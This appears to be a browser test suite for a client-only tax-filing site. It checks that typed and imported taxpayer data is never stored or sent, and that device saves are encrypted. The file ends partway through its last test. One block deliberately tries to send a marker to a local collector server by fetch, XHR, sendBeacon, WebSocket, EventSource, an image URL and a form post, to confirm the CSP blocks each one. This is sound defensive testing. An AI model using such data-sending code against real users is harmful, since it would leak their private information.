import fs from 'fs';
import http from 'http';
import path from 'path';
import { randomUUID } from 'crypto';
import yaml from 'js-yaml';
import type { AddressInfo } from 'net';
import type { Browser, BrowserContext, Page, Request } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { scenarioFactGraphJson } from '../../saveState/saveStateTestUtils.js';
import { createSaveState } from '../../saveState/saveStateSchema.js';
import { DEVICE_SAVE_KEY } from '../../saveState/deviceSaveStore.js';
import { createFlowConfig } from '../../flow/flowConfig.js';
import flowNodes from '../../flow/flow.js';
import { launchPinnedChromium } from './pinnedChromium.js';
import {
  decryptText,
  ENCRYPTED_FORMAT,
  ENCRYPTED_VERSION,
  PBKDF2_ITERATIONS,
  type EncryptedEnvelope,
} from '../../saveState/saveStateCrypto.js';
import { startStagedSiteServer, type StagedSiteServer } from './stagedSiteServer.js';

/**
 * No-retention proof for the static client-only build, in a real browser (#132, #126).
 *
 * Runs the staged site (`npm run build:static && npm run stage:static`) in pinned headless Chromium, served locally
 * with the site's own `_headers` and `_redirects`, and drives the app the way a person would: start a return, type a
 * name, date of birth, address and phone number into the interview (autosave), import a golden end-to-end scenario
 * (synthetic data) save file carrying a TIN and a wage amount, open every income screen, save and read the wages
 * back, open review, and attempt PDF, sign, and submit. Every value typed or imported is a unique marker.
 *
 * Asserted for the whole session, across every page, worker and service worker in the browser context:
 * - every request is a same-origin GET for a static asset, with no body and no query string;
 * - no request to the `.invalid` API origin or any other origin; nothing reaches a second local "collector" server,
 *   even when the page deliberately tries fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, a
 *   cross-origin image and a form post to it; no WebSocket is opened to any host;
 * - no request URL, header or body contains a marker: plain, JSON-escaped, URL-encoded, UTF-16, base64 or
 *   base64url, and the TIN even when split into its parts (the search itself is tested first);
 * - the CSP is sent as a response header with connect-src, form-action and frame-ancestors 'none' and no unsafe-*
 *   script source;
 * - after switching to Español, after the session and again after a reload, localStorage, sessionStorage,
 *   IndexedDB, Cache Storage, the origin private file system, cookies and service-worker registrations are empty,
 *   and after the reload the return is gone;
 * - only an explicit "Save on this device" writes, and what it writes is one envelope with exactly the expected
 *   fields: PBKDF2-SHA-256 at the configured iterations, a 16-byte salt, a 12-byte IV and a base64 AES-GCM
 *   ciphertext that opens with the passphrase only; no marker or passphrase is in it; "Clear all data on this
 *   device" removes it, and nothing comes back after a reload.
 *
 * Chromium is the revision pinned by the playwright devDependency (`launchPinnedChromium`). Nothing outside 127.0.0.1
 * is contacted: requests to any other host are aborted and fail the test.
 */

const flow = createFlowConfig(flowNodes);
const incomeScreens = flow.screens.filter((screen) => screen.categoryRoute === `/flow/income`);

const APP_DIR = path.resolve(__dirname, `../../..`);
const SITE_DIR = path.resolve(APP_DIR, `../cloudflare-pages/out`);

type Section = Record<string, string>;
const t = (
  yaml.load(fs.readFileSync(path.join(APP_DIR, `src/locales/en.saveState.yaml`), `utf8`)) as {
    account: { deviceData: { title: string; export: Section; import: Section; device: Section; clear: Section } };
  }
).account.deviceData;

const refusal = (
  yaml.load(fs.readFileSync(path.join(APP_DIR, `src/locales/en.staticClient.yaml`), `utf8`)) as {
    systemAlerts: {
      staticClient: {
        pdfRefusal: { alertText: { heading: string } };
        efileRefusal: { alertText: { heading: string } };
      };
    };
  }
).systemAlerts.staticClient;

/** Typed into the interview. */
const UI = {
  firstName: `Quillonmark`,
  lastName: `Zephyrcanary`,
  street: `88 Vantablue Court`,
  phone: `2025550147`,
};
/** Carried by the imported save file. */
const FILE = {
  firstName: `Orrinwisp`,
  lastName: `Thistlecanary`,
  tin: { area: `900`, group: `70`, serial: `0001` },
  wages: `73519.47`,
};
/** The phone and TIN as the fact graph stores them. */
const PHONE_JSON = `"areaCode":"202","officeCode":"555","lineNumber":"0147"`;
const TIN_JSON = `"area":"900","group":"70","serial":"0001"`;
const MARKERS = [
  UI.firstName,
  UI.lastName,
  `Vantablue`,
  UI.phone,
  `202-555-0147`,
  PHONE_JSON,
  FILE.firstName,
  FILE.lastName,
  `900700001`,
  `900-70-0001`,
  TIN_JSON,
  FILE.wages,
  `73,519.47`,
];
const PASSPHRASE = `lantern orchard granite 42`;
/** Standard base64 (what `btoa` writes), padded. */
const BASE64 = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;
const base64Bytes = (value: unknown) => {
  expect(typeof value).toBe(`string`);
  expect(value).toMatch(BASE64);
  return Buffer.from(value as string, `base64`);
};
/** AES-GCM appends a 16-byte tag, so the ciphertext is at least that long. */
const GCM_TAG_BYTES = 16;

/**
 * The stored value is ciphertext and its public parameters only: exactly the envelope fields, PBKDF2-SHA-256 at the
 * configured iterations, a 16-byte salt and a 12-byte IV, and a base64 AES-GCM ciphertext. No other field can hold a
 * string longer than the salt, so nothing readable sits next to the ciphertext. It must also open with the
 * passphrase (and only with it), so it really is the encrypted return.
 */
async function assertEncryptedEnvelope(value: string, expectedMarkers: string[]) {
  const envelope = JSON.parse(value) as EncryptedEnvelope;
  expect(Object.keys(envelope).sort()).toEqual([`cipher`, `ciphertext`, `format`, `kdf`, `version`]);
  expect(envelope.format).toBe(ENCRYPTED_FORMAT);
  expect(envelope.version).toBe(ENCRYPTED_VERSION);
  expect(Object.keys(envelope.kdf).sort()).toEqual([`hash`, `iterations`, `name`, `salt`]);
  expect(envelope.kdf).toMatchObject({ name: `PBKDF2`, hash: `SHA-256`, iterations: PBKDF2_ITERATIONS });
  expect(Object.keys(envelope.cipher).sort()).toEqual([`iv`, `name`]);
  expect(envelope.cipher.name).toBe(`AES-GCM`);
  expect(base64Bytes(envelope.kdf.salt).length).toBe(16);
  expect(base64Bytes(envelope.cipher.iv).length).toBe(12);
  expect(base64Bytes(envelope.ciphertext).length).toBeGreaterThan(GCM_TAG_BYTES);
  const strings: string[] = [];
  JSON.stringify({ ...envelope, ciphertext: null }, (_k, v) => (typeof v === `string` && strings.push(v), v));
  expect(strings.filter((v) => v.length > envelope.kdf.salt.length)).toEqual([]);

  const plaintext = await decryptText(envelope, PASSPHRASE);
  expect(findMarkers(plaintext)).toEqual(expect.arrayContaining(expectedMarkers));
  await expect(decryptText(envelope, `${PASSPHRASE} wrong`)).rejects.toThrow();
}

/**
 * The TIN as its three parts in any order, with only non-digits between them (dashes, spaces, JSON keys and quotes,
 * escapes, NULs of UTF-16), so a TIN split up or stored as separate fields is still found.
 */
const TIN_PARTS = (() => {
  const { area, group, serial } = FILE.tin;
  const orders = [
    [area, group, serial],
    [area, serial, group],
    [group, area, serial],
    [group, serial, area],
    [serial, area, group],
    [serial, group, area],
  ];
  return new RegExp(orders.map((o) => `(?<!\\d)${o.join(`\\D{0,40}`)}(?!\\d)`).join(`|`));
})();
const TIN_SPLIT = `TIN ${FILE.tin.area}-${FILE.tin.group}-${FILE.tin.serial} in parts`;

const latin1 = (b: Buffer) => b.toString(`latin1`);
const swapBytes = (b: Buffer) => {
  const out = Buffer.from(b);
  out.swap16();
  return out;
};

/**
 * A marker as it could appear in a request: as text (plain, lowercased, JSON-escaped once or twice), each in UTF-8,
 * UTF-16LE and UTF-16BE bytes, and each of those raw, URL-encoded, or inside base64/base64url at any alignment (raw
 * and URL-encoded).
 */
function encodings(marker: string): string[] {
  const texts = new Set([marker, marker.toLowerCase()]);
  for (const text of [...texts]) {
    const once = JSON.stringify(text).slice(1, -1);
    texts.add(once);
    texts.add(JSON.stringify(once).slice(1, -1));
  }
  const forms = new Set<string>();
  for (const text of texts) {
    const utf16le = Buffer.from(text, `utf16le`);
    for (const bytes of [Buffer.from(text, `utf8`), utf16le, swapBytes(utf16le)]) {
      const raw = latin1(bytes);
      forms.add(raw);
      forms.add(encodeURIComponent(raw));
      forms.add(encodeURIComponent(raw).replace(/%20/g, `+`));
      for (const pad of [0, 1, 2]) {
        const b64 = Buffer.concat([Buffer.alloc(pad, 0x61), bytes]).toString(`base64`);
        // Drop the characters that depend on the bytes around the marker.
        const core = b64.slice(pad === 0 ? 0 : pad + 2, b64.length - 4);
        if (core.length >= 8) {
          for (const c of [core, core.replace(/\+/g, `-`).replace(/\//g, `_`)]) {
            forms.add(c);
            forms.add(encodeURIComponent(c));
          }
        }
      }
    }
  }
  return [...forms];
}
const MARKER_FORMS = MARKERS.flatMap((m) => encodings(m).map((form) => ({ marker: m, form })));

/** Every way to read `text`: as is, URL-decoded, without NULs (UTF-16), and each base64-looking run decoded. */
function views(text: string): string[] {
  const out = new Set([text]);
  const add = (v: string) => {
    out.add(v);
    out.add(v.replace(/\0/g, ``));
  };
  add(text);
  try {
    add(decodeURIComponent(text.replace(/\+/g, ` `)));
  } catch {
    // Not URL-encoded text.
  }
  for (const v of [...out]) {
    for (const run of v.match(/[A-Za-z0-9+/_-]{12,}/g) ?? []) {
      const std = run.replace(/-/g, `+`).replace(/_/g, `/`);
      for (let shift = 0; shift < 4; shift++) {
        add(latin1(Buffer.from(std.slice(shift), `base64`)));
      }
    }
  }
  return [...out];
}

const findMarkers = (text: string) => {
  const all = views(text);
  const found = new Set(MARKER_FORMS.filter(({ form }) => all.some((v) => v.includes(form))).map((f) => f.marker));
  if (all.some((v) => TIN_PARTS.test(v))) found.add(TIN_SPLIT);
  return [...found];
};

/** The scenario's facts with the markers written into the primary filer and the W-2. */
function markerSaveFile(): string {
  const facts = scenarioFactGraphJson() as Record<string, { $type: string; item: unknown }>;
  const primary = Object.keys(facts)
    .find((k) => k.endsWith(`/isPrimaryFiler`) && facts[k].item === true)
    ?.replace(/\/isPrimaryFiler$/, ``);
  const w2 = (facts[`/formW2s`].item as { items: string[] }).items[0];
  expect(primary).toBeTruthy();
  facts[`${primary}/firstName`] = { $type: `gov.irs.factgraph.persisters.StringWrapper`, item: FILE.firstName };
  facts[`${primary}/lastName`] = { $type: `gov.irs.factgraph.persisters.StringWrapper`, item: FILE.lastName };
  facts[`${primary}/tin`] = { $type: `gov.irs.factgraph.persisters.TinWrapper`, item: FILE.tin };
  facts[`/formW2s/#${w2}/writableWages`] = { $type: `gov.irs.factgraph.persisters.DollarWrapper`, item: FILE.wages };
  // One synthetic item in each writable income collection so those screens can open.
  const collectionType = facts[`/formW2s`].$type;
  for (const collection of [
    `/form1099Gs`,
    `/form1099Miscs`,
    `/form1099Rs`,
    `/interestReports`,
    `/dividendReports`,
    `/socialSecurityReports`,
    `/scheduleCBusinesses`,
    `/scheduleEEstates`,
    `/scheduleEK1s`,
    `/cdccCareProviders`,
    `/hsaDistributions`,
  ]) {
    const items = (facts[collection]?.item as { items?: unknown } | undefined)?.items;
    if (!Array.isArray(items) || items.length === 0) {
      facts[collection] = { $type: collectionType, item: { items: [randomUUID()] } };
    }
  }
  const text = JSON.stringify(createSaveState(facts));
  expect(findMarkers(text)).toEqual(expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages]));
  return text;
}

/** First item id of each collection in the save file, keyed by the collection path (`/formW2s`). */
function collectionItemIds(saveText: string): Map<string, string> {
  const facts = (JSON.parse(saveText) as { facts: Record<string, { item?: { items?: unknown } }> }).facts;
  const ids = new Map<string, string>();
  for (const [factPath, fact] of Object.entries(facts)) {
    const items =
      fact?.item && typeof fact.item === `object` && fact.item !== null && `items` in fact.item
        ? (fact.item as { items: unknown }).items
        : undefined;
    if (Array.isArray(items) && typeof items[0] === `string` && /^\/[A-Za-z][A-Za-z0-9]*$/.test(factPath)) {
      ids.set(factPath, items[0]);
    }
  }
  return ids;
}

/** In-app navigation. A full page load would drop the in-memory return. */
async function openInApp(page: Page, url: string) {
  await page.evaluate((to) => {
    window.history.pushState({}, ``, to);
    window.dispatchEvent(new PopStateEvent(`popstate`));
  }, url);
}

const INCOME_GROUPS = [
  `/flow/income/income-sources/`,
  `/flow/income/jobs/`,
  `/flow/income/unemployment/`,
  `/flow/income/interest/`,
  `/flow/income/dividends/`,
  `/flow/income/retirement/`,
  `/flow/income/social-security/`,
  `/flow/income/hsa/`,
  `/flow/income/dependent-care/`,
  `/flow/income/alaska-pfd/`,
  `/flow/income/schedule-c/`,
  `/flow/income/schedule-e/`,
  `/flow/income/total-income-summary/`,
];

type Recorded = {
  method: string;
  url: string;
  resourceType: string;
  body: string | null;
  headers: string;
  /** Set when the browser refused the request itself (for example `net::ERR_BLOCKED_BY_CSP`). */
  failure?: string;
};

/** A second origin that the page must never reach. */
async function startCollector() {
  const hits: string[] = [];
  const server = http.createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(204).end();
  });
  server.on(`upgrade`, (req, socket) => {
    hits.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, `127.0.0.1`, resolve));
  const { port } = server.address() as AddressInfo;
  return {
    origin: `http://127.0.0.1:${port}`,
    hits,
    close: () =>
      new Promise<void>((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}

describe(`static client: no taxpayer data is kept in the browser or sent anywhere (real browser)`, () => {
  let site: StagedSiteServer;
  let collector: Awaited<ReturnType<typeof startCollector>>;
  let browser: Browser;
  let saveFile: string;

  beforeAll(async () => {
    if (!fs.existsSync(path.join(SITE_DIR, `index.html`))) {
      throw new Error(`${SITE_DIR} not found: run npm run build:static && npm run stage:static first`);
    }
    saveFile = markerSaveFile();
    site = await startStagedSiteServer(SITE_DIR);
    collector = await startCollector();
    browser = await launchPinnedChromium();
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    await collector?.close();
    await site?.close();
  });

  /** A fresh profile whose every request (pages, workers, service workers) is recorded. */
  async function newSession() {
    const context = await browser.newContext({ acceptDownloads: true, serviceWorkers: `allow` });
    const requests: Request[] = [];
    const aborted: string[] = [];
    context.on(`request`, (r) => requests.push(r));
    await context.route(`**/*`, (route) => {
      const url = route.request().url();
      // Let the collector through so a request that escaped the page's defenses would be seen there too.
      if (url.startsWith(`${site.origin}/`) || url.startsWith(`${collector.origin}/`)) return route.continue();
      aborted.push(`${route.request().method()} ${url}`);
      return route.abort(`blockedbyclient`);
    });
    // `route` does not see WebSockets: fail those closed separately, whatever the host.
    const webSockets: string[] = [];
    await context.routeWebSocket(/.*/, (ws) => {
      webSockets.push(`routed ${ws.url()}`);
      return ws.close();
    });
    context.on(`page`, (p) => p.on(`websocket`, (ws) => webSockets.push(`opened ${ws.url()}`)));
    const page = await context.newPage();
    page.setDefaultTimeout(20_000);
    const recorded = () =>
      Promise.all(
        requests.map(
          async (r): Promise<Recorded> => ({
            method: r.method(),
            url: r.url(),
            resourceType: r.resourceType(),
            body: r.postData(),
            headers: JSON.stringify(await r.allHeaders().catch(() => r.headers())),
            failure: r.failure()?.errorText,
          })
        )
      );
    return { context, page, recorded, aborted, webSockets };
  }

  const snapshotStorage = async (context: BrowserContext, page: Page) => {
    const inPage = await page.evaluate(async () => {
      const entries = (s: Storage) => Object.keys(s).map((k) => [k, s.getItem(k) ?? ``] as [string, string]);
      return {
        localStorage: entries(localStorage),
        sessionStorage: entries(sessionStorage),
        indexedDB: (await indexedDB.databases()).map((d) => d.name ?? ``),
        cacheStorage: await caches.keys(),
        serviceWorkers: (await navigator.serviceWorker.getRegistrations()).map((r) => r.scope),
        documentCookie: document.cookie,
        // Origin private file system.
        opfs: await (async () => {
          const names: string[] = [];
          const root = (await navigator.storage.getDirectory()) as FileSystemDirectoryHandle & {
            keys(): AsyncIterable<string>;
          };
          for await (const name of root.keys()) names.push(name);
          return names;
        })(),
      };
    });
    const cookies = (await context.cookies()).map((c) => `${c.name}=${c.value}`);
    return { ...inPage, cookies, contextServiceWorkers: context.serviceWorkers().map((w) => w.url()) };
  };

  const EMPTY = {
    localStorage: [],
    sessionStorage: [],
    indexedDB: [],
    cacheStorage: [],
    serviceWorkers: [],
    documentCookie: ``,
    opfs: [],
    cookies: [],
    contextServiceWorkers: [],
  };

  /**
   * `deliberate` are the exfiltration attempts made on purpose; each must have been refused by the browser itself
   * (CSP), so it never reached the network. Every other request must be a plain same-origin asset GET.
   */
  async function assertNetwork(recorded: () => Promise<Recorded[]>, aborted: string[], webSockets: string[]) {
    const all = await recorded();
    expect(all.length).toBeGreaterThan(0);
    // blob: URLs are the in-page save file downloads; they never leave the browser.
    const network = all.filter((r) => !r.url.startsWith(`blob:`) && !r.url.startsWith(`data:`));
    const deliberate = network.filter((r) => r.url.startsWith(`${collector.origin}/`));
    // Chromium reports these as failed with reason `csp` (net::ERR_BLOCKED_BY_CSP).
    expect(deliberate.filter((r) => !/csp/i.test(r.failure ?? ``)).map((r) => [r.url, r.failure])).toEqual([]);
    const sent = network.filter((r) => !deliberate.includes(r));
    expect(aborted).toEqual([]);
    expect(webSockets).toEqual([]);
    expect(sent.filter((r) => !r.url.startsWith(`${site.origin}/`)).map((r) => r.url)).toEqual([]);
    expect(sent.filter((r) => r.url.includes(`.invalid`)).map((r) => r.url)).toEqual([]);
    expect(sent.filter((r) => r.method !== `GET`).map((r) => `${r.method} ${r.url}`)).toEqual([]);
    expect(sent.filter((r) => r.body !== null).map((r) => r.url)).toEqual([]);
    expect(sent.filter((r) => new URL(r.url).search !== ``).map((r) => r.url)).toEqual([]);
    // Anything but a page load must be a file of the staged site (no made-up path can carry data).
    const notStaged = sent.filter((r) => {
      if (r.resourceType === `document`) return false;
      const file = path.join(SITE_DIR, decodeURIComponent(new URL(r.url).pathname));
      return !file.startsWith(`${SITE_DIR}${path.sep}`) || !fs.statSync(file, { throwIfNoEntry: false })?.isFile();
    });
    expect(notStaged.map((r) => `${r.resourceType} ${r.url}`)).toEqual([]);
    const leaks = sent.flatMap((r) =>
      findMarkers(`${r.url}\n${r.headers}\n${r.body ?? ``}`).map((m) => `${m} in ${r.url}`)
    );
    expect(leaks).toEqual([]);
    expect(collector.hits).toEqual([]);
    expect(site.requests.filter((r) => r.method !== `GET` || r.body !== ``)).toEqual([]);
  }

  const startReturn = async (page: Page) => {
    await page.getByRole(`button`, { name: /^Start my \d{4} federal tax return$/ }).click();
    await page.waitForURL(/\/pre-checklist/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/load-taxpayer-info/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/checklist/);
  };

  /**
   * In-app (history API) navigation to the device data page: no page load, so the in-memory return stays, as when
   * the page is opened from the Account page.
   */
  const openDeviceData = async (page: Page) => {
    await page.evaluate(() => {
      window.history.pushState({}, ``, `/df/file/account/device-data`);
      window.dispatchEvent(new PopStateEvent(`popstate`));
    });
    await page.getByRole(`heading`, { name: t.title, level: 1 }).waitFor();
  };

  const statusShows = (page: Page, text: string) =>
    page.getByTestId(`device-data-status`).filter({ hasText: text }).waitFor();

  const exportPlaintext = async (page: Page) => {
    await page.locator(`label[for="export-plaintext-ack"]`).click();
    expect(await page.locator(`#export-plaintext-ack`).isChecked()).toBe(true);
    const [download] = await Promise.all([
      page.waitForEvent(`download`),
      page.getByRole(`button`, { name: t.export.button }).click(),
    ]);
    const text = fs.readFileSync(await download.path(), `utf8`);
    await download.delete();
    return text;
  };

  const importSaveFile = async (page: Page) => {
    await page.locator(`#import-file`).setInputFiles({
      name: `scenario.json`,
      mimeType: `application/json`,
      buffer: Buffer.from(saveFile),
    });
    await page.getByRole(`button`, { name: t.import.button }).click();
    await statusShows(page, t.import.done);
  };

  it(`the marker search finds every encoding it claims to`, () => {
    const b64 = (b: Buffer) => b.toString(`base64`);
    const utf16le = (text: string) => Buffer.from(text, `utf16le`);
    const utf16be = (text: string) => swapBytes(utf16le(text));
    const fragment = { area: FILE.tin.area, group: FILE.tin.group, serial: FILE.tin.serial };
    const cases: [string, string][] = [
      [`x-a: Zephyrcanary`, UI.lastName],
      [`/assets/zephyrcanary.js`, UI.lastName],
      [`?q=${encodeURIComponent(UI.street)}`, `Vantablue`],
      [`?q=${encodeURIComponent(JSON.stringify(JSON.stringify({ fragment })))}`, TIN_JSON],
      [JSON.stringify(JSON.stringify(JSON.stringify(fragment))), TIN_JSON],
      [`{"v":"${JSON.stringify(`"${PHONE_JSON}"`).slice(1, -1)}"}`, PHONE_JSON],
      [latin1(utf16le(`id ${FILE.lastName}`)), FILE.lastName],
      [latin1(utf16be(FILE.firstName)), FILE.firstName],
      [encodeURIComponent(latin1(utf16le(FILE.wages))), FILE.wages],
      [`x=${b64(utf16le(`..${FILE.lastName}`))}`, FILE.lastName],
      [`x=${b64(utf16be(`.${PHONE_JSON}`))}`, PHONE_JSON],
      [
        `/p/${b64(Buffer.from(`ab${UI.firstName}`))
          .replace(/\+/g, `-`)
          .replace(/\//g, `_`)}`,
        UI.firstName,
      ],
      [`x=${encodeURIComponent(b64(Buffer.from(`?>${FILE.wages}`)))}`, FILE.wages],
      [`tin 900 70 0001`, TIN_SPLIT],
      [`{"serial":"0001","note":"x","area":"900","group":"70"}`, TIN_SPLIT],
      [latin1(utf16le(`900/70/0001`)), TIN_SPLIT],
      [`h=${b64(Buffer.from(`group=70&area=900&serial=0001`))}`, TIN_SPLIT],
    ];
    for (const [text, marker] of cases)
      expect([text, findMarkers(text)]).toEqual([text, expect.arrayContaining([marker])]);
    // No false alarms on what the site normally sends.
    expect(
      findMarkers(`GET /df/file/assets/index-9a0f7c1d.js {"accept":"*/*","sec-ch-ua":"Chromium";v="141"}`)
    ).toEqual([]);
  });

  it(`keeps nothing after the session or a reload, and sends nothing`, async () => {
    const { context, page, recorded, aborted, webSockets } = await newSession();
    const home = await page.goto(`${site.origin}/df/file/home`);

    // The CSP is enforced from the response header, not only the <meta> tag.
    const csp = home?.headers()[`content-security-policy`] ?? ``;
    const directive = (name: string) =>
      csp
        .split(`;`)
        .map((d) => d.trim())
        .find((d) => d.startsWith(`${name} `));
    expect(directive(`connect-src`)).toBe(`connect-src 'none'`);
    expect(directive(`form-action`)).toBe(`form-action 'none'`);
    expect(directive(`frame-ancestors`)).toBe(`frame-ancestors 'none'`);
    expect(directive(`script-src`)).toBeTruthy();
    expect(directive(`script-src`)).not.toContain(`unsafe-`);

    // Interview: name, date of birth, address and phone, each saved with "Save and continue" (autosave).
    await startReturn(page);
    await page.getByRole(`link`, { name: `Start`, exact: true }).click();
    await page.waitForURL(/\/about-you-intro/);
    await page.getByRole(`button`, { name: `Continue`, exact: true }).click();
    await page.waitForURL(/\/about-you-basic-info/);
    await page.locator(`input[id$="/firstName"]`).fill(UI.firstName);
    await page.locator(`input[id$="/lastName"]`).fill(UI.lastName);
    await page.locator(`#month`).fill(`04`);
    await page.locator(`#day`).fill(`17`);
    await page.locator(`#year`).fill(`1983`);
    await page.getByRole(`button`, { name: `Save and continue` }).click();
    await page.waitForURL(/\/about-you-contact-info/);
    await page.getByLabel(/^Address/).fill(UI.street);
    await page.locator(`[id="id-/address__city"]`).fill(`Amarillo`);
    await page.locator(`[id="id-/address__stateOrProvence"]`).selectOption({ label: `Texas` });
    await page.locator(`[id="id-/address__postalCode"]`).fill(`79101`);
    await page.locator(`[id="id-/phone"]`).fill(UI.phone);
    await page.getByRole(`button`, { name: `Save and continue` }).click();
    await page.waitForURL(/\/about-you-occupation/);

    // The typed answers are in the return held by the page...
    await openDeviceData(page);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([UI.firstName, UI.lastName, `Vantablue`, PHONE_JSON])
    );
    // ...and so are the imported TIN and wages.
    await importSaveFile(page);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages])
    );

    // Every income screen, then save the imported wages and read them back on that screen.
    expect(incomeScreens.length).toBeGreaterThan(100);
    for (const group of INCOME_GROUPS) {
      expect(incomeScreens.some((screen) => screen.screenRoute.startsWith(group))).toBe(true);
    }
    const ids = collectionItemIds(saveFile);
    const savedFacts = (JSON.parse(saveFile) as { facts: Record<string, { item?: unknown }> }).facts;
    const primaryKey = Object.keys(savedFacts).find(
      (key) => key.endsWith(`/isPrimaryFiler`) && savedFacts[key].item === true
    );
    const primaryFilerId = primaryKey?.match(/#([^/]+)\/isPrimaryFiler$/)?.[1];
    const openIncomeScreen = async (screen: (typeof incomeScreens)[number]) => {
      const fromFile = screen.collectionContext ? ids.get(screen.collectionContext) : undefined;
      const itemId =
        fromFile ?? (screen.collectionContext === `/filersWithHsa` && primaryFilerId ? primaryFilerId : undefined);
      const query = itemId ? `?${new URLSearchParams([[screen.collectionContext as string, itemId]])}` : ``;
      await openInApp(page, `/df/file${screen.screenRoute}${query}`);
      await page.waitForFunction(
        (expected) => location.pathname.endsWith(expected) || location.pathname.endsWith(`/not-found`),
        screen.screenRoute,
        { timeout: 8_000 }
      );
    };
    const missed: string[] = [];
    for (const screen of incomeScreens) {
      try {
        await openIncomeScreen(screen);
        const landed = new URL(page.url()).pathname;
        if (!landed.endsWith(screen.screenRoute)) {
          missed.push(`${screen.screenRoute} -> ${landed}`);
        } else if ((await page.getByText(`We’re experiencing a problem`).count()) > 0) {
          missed.push(`${screen.screenRoute} error`);
        }
      } catch {
        missed.push(screen.screenRoute);
      }
    }
    expect(missed).toEqual([]);

    const wagesScreen = incomeScreens.find((screen) => screen.route === `w2-add-boxes-1-8`);
    expect(wagesScreen?.collectionContext).toBeTruthy();
    await openIncomeScreen(wagesScreen!);
    await page.locator(`main h1`).waitFor();
    const wageValues = async () =>
      page.locator(`main input`).evaluateAll((els) => els.map((el) => (el as HTMLInputElement).value));
    const showsWages = async () => {
      const values = await wageValues();
      const text = await page.locator(`main`).innerText();
      return values.some((value) => value.includes(`73519`) || value.includes(`73,519`)) || text.includes(FILE.wages);
    };
    expect(await showsWages()).toBe(true);
    const saveButton = page.getByRole(`button`, { name: `Save and continue` });
    await saveButton.click();
    await page.waitForFunction((route) => !location.pathname.endsWith(route), wagesScreen!.screenRoute, {
      timeout: 15_000,
    });
    expect(await page.getByText(`We’re having a problem with our network`).count()).toBe(0);
    await openIncomeScreen(wagesScreen!);
    await page.locator(`main h1`).waitFor();
    expect(await showsWages()).toBe(true);

    // Review, then PDF / sign / submit. Each refusal is on-screen. Neither opens a PDF nor a success screen.
    await openInApp(page, `/df/file/flow/complete/review/review`);
    await page.getByRole(`heading`, { name: `Review and confirm`, level: 1 }).waitFor();
    const pagesBeforePdf = context.pages().length;
    await page.getByRole(`button`, { name: `Draft form 1040 (PDF)` }).click();
    await page
      .getByTestId(`static-pdf-refusal`)
      .getByRole(`heading`, { name: refusal.pdfRefusal.alertText.heading })
      .waitFor();
    expect(context.pages().length).toBe(pagesBeforePdf);
    expect(await page.getByText(/You submitted your/).count()).toBe(0);

    await openInApp(page, `/df/file/flow/complete/submit/sign-return-submit`);
    await page.getByRole(`heading`, { name: /time to submit your federal tax return/, level: 1 }).waitFor();
    const checkboxes = page.getByRole(`checkbox`);
    for (let i = 0; i < (await checkboxes.count()); i++) await checkboxes.nth(i).check();
    await page.getByRole(`button`, { name: /tax return/ }).click();
    await page
      .getByTestId(`system-alert`)
      .getByRole(`heading`, { name: refusal.efileRefusal.alertText.heading })
      .waitFor();
    expect(page.url()).not.toContain(`sign-return-done`);
    expect(await page.getByText(/You submitted your/).count()).toBe(0);

    // Deliberate exfiltration attempts with a marker are all refused before they reach the network.
    const attempts = await page.evaluate(
      async ({ target, marker }) => {
        const outcome = async (fn: () => Promise<unknown> | unknown) => {
          try {
            await fn();
            return `sent`;
          } catch {
            return `refused`;
          }
        };
        const img = await new Promise<string>((resolve) => {
          const i = new Image();
          i.onload = () => resolve(`sent`);
          i.onerror = () => resolve(`refused`);
          i.src = `${target}/img?m=${marker}`;
        });
        const form = await new Promise<string>((resolve) => {
          document.addEventListener(`securitypolicyviolation`, (e) => {
            if (e.violatedDirective === `form-action`) resolve(`refused`);
          });
          const f = document.createElement(`form`);
          f.method = `post`;
          f.action = `${target}/form`;
          f.target = `_blank`;
          const input = document.createElement(`input`);
          input.name = `m`;
          input.value = marker;
          f.appendChild(input);
          document.body.appendChild(f);
          f.submit();
          f.remove();
          setTimeout(() => resolve(`no violation reported`), 3000);
        });
        return {
          fetch: await outcome(() => fetch(`${target}/fetch`, { method: `POST`, body: marker })),
          xhr: await outcome(() => {
            const x = new XMLHttpRequest();
            x.open(`POST`, `${target}/xhr`);
            x.send(marker);
          }),
          beacon: navigator.sendBeacon(`${target}/beacon`, marker) ? `sent` : `refused`,
          webSocket: await outcome(() => new WebSocket(`${target.replace(/^http/, `ws`)}/ws?m=${marker}`)),
          eventSource: await outcome(() => new EventSource(`${target}/sse?m=${marker}`)),
          img,
          form,
        };
      },
      { target: collector.origin, marker: FILE.lastName }
    );
    expect(attempts).toEqual({
      fetch: `refused`,
      xhr: `refused`,
      beacon: `refused`,
      webSocket: `refused`,
      eventSource: `refused`,
      img: `refused`,
      form: `refused`,
    });

    // Switching to Español (and back) changes the page language but stores nothing.
    await page.getByRole(`button`, { name: /Español/ }).click();
    await page.waitForFunction(() => document.documentElement.lang === `es-US`);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);
    await page.getByRole(`button`, { name: /English/ }).click();
    await page.waitForFunction(() => document.documentElement.lang === `en`);

    // Nothing is kept on the device during the session...
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);
    // ...or after a reload, and the return is gone.
    await page.reload();
    await page.waitForLoadState(`load`);
    await page.goto(`${site.origin}/df/file/home`);
    await page.getByRole(`button`, { name: /^Start my \d{4} federal tax return$/ }).waitFor();
    expect(findMarkers(await page.content())).toEqual([]);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);

    await assertNetwork(recorded, aborted, webSockets);
    await context.close();
  }, 600_000);

  it(`writes only an encrypted copy on an explicit save, and "Clear all data" removes it`, async () => {
    const { context, page, recorded, aborted, webSockets } = await newSession();
    await page.goto(`${site.origin}/df/file/home`);
    await startReturn(page);
